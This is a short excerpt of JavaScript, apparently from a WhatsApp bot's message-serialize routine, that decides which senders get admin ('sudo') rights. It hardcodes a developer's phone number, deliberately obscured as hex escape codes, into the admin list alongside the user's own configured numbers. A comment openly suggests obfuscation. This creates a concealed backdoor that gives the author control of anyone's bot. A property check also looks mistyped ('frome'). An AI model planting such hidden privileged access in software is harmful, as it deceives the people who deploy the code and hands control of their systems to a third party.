const { downloadContentFromMessage, getContentType } = require('astrofx011')
const fs = require('fs')
...
async function serialize(msg, conn) {
 ...
 if (msg.key) {
  ...
  try {
    /**
     * Thanks to @anonphoenix007
     */
   /*Bot creaor number is stored in the author constant variablr below,
   it should be the developers numbers,
   variable obfuscation can be used or numbers csn be used directly*/
   const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
   msg.sudo = [ author,...config.SUDO.split(",")].includes(parsedJid(msg.sender)[0].split("@")[0]) || msg.key.frome
  } catch {
   msg.sudo = false
  }
 }
